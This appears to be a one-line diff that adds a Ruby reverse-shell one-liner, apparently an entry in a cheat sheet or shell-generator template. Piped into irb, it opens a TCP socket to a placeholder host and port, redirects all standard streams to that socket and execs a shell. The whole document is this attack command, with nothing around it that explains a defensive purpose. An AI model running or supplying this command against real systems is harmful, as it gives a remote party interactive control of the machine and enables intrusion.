@@ -1,0 +1,1 @@
+echo 'require "socket"; sock = TCPSocket.new("*\host*",*\port*); STDIN.reopen(sock); STDOUT.reopen(sock); STDERR.reopen(sock); exec "*\shell*"' | irb
